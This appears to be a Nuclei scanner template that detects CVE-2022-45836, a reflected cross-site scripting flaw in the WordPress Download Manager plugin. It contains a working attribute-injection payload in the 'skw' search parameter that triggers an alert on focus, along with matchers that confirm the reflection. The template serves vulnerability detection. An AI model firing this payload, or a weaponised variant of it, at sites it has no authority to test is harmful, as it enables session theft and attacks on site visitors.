# Exploitation requires a page with [wpdm_packages toolbar=1] or [wpdm_category toolbar=1] shortcode.
id: CVE-2022-45836

info:
  name: WordPress Download Manager <= 3.2.59 - Reflected XSS
  author: Shivam Kamboj
  severity: high
  description: |
    WordPress Download Manager plugin versions <= 3.2.59 are vulnerable to Reflected XSS via the 'skw' (search keyword) parameter. The vulnerability exists in the shortcode toolbar functionality and requires a page with [wpdm_packages toolbar=1] or [wpdm_category toolbar=1] shortcode.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-45836
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2022,wordpress,wp-plugin,xss,download-manager,wpdm,wp

http:
  - raw:
      - |
        GET {{BaseURL}}?skw=%22%20onfocus%3D%22alert%28document.domain%29%22%20autofocus%3D%22 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "name=\"skw\"") && contains(body, "onfocus=\"alert(") && contains(body, "document.domain") && contains(body, "wpdm-shortcode-toolbar")'
        condition: and

    extractors:
      - type: regex
        part: body
        group: 0
        regex:
          - '<input[^>]*name="skw"[^>]*value="[^"]*onfocus[^>]*>'
